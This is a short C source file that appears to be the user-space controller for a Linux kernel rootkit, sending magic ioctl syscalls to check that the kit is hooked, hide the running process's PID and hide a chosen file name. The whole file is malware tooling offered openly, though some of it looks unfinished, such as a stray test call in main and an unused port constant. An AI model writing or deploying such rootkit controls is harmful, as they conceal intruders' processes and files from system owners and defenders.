#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>

#define SA struct sockaddr
#define PORT 4200
#define ROOTKIT -1877
#define BUFSIZE 100
#define SENDPID 8008
#define GOTIME 8675309
#define CHECKUP 80085
#define GOODRET 42
#define HIDEFILE 1234

int main() {
    // signalRootKit();
    syscall(SYS_ioctl, 80085,0x195);
}

void signalRootKit() {
    char success[] = "Kit hooked...\n";
    char fail[] = "Kit failed to hook...\n";
    int status = syscall(SYS_ioctl, ROOTKIT, GOTIME);
    if(status == GOODRET) {
        printf(success);
    } else {
        printf(fail);
    }
}

void checkRootkit(int sockfd) {
    //syscall: open certain file name, expect an unusual and specific return
   char success[] = "Kit hooked...\n";
    char fail[] = "Kit failed to hook...\n";
    int status = syscall(SYS_ioctl, ROOTKIT, CHECKUP);
    if(status == GOODRET) {
        printf(success);
    } else {
        printf(fail);
    }
}

void hideMyPid(int sockfd) {
    int pid = getpid();
    char success[] = "Kit hooked...\n";
    char fail[] = "Kit failed to hook...\n";
    int status = syscall(SYS_ioctl, ROOTKIT, SENDPID, pid);
    if(status == GOODRET) {
        printf(success);
    } else {
        printf(fail);
    } 
}

void hideMyFileName(char *fname[]) {
    char success[] = "Kit hooked...\n";
    char fail[] = "Kit failed to hook...\n";
    int status = syscall(SYS_ioctl, ROOTKIT, HIDEFILE, (long)fname);

   if(status == GOODRET) {
        printf(success);
    } else {
        printf(fail);
    } 
}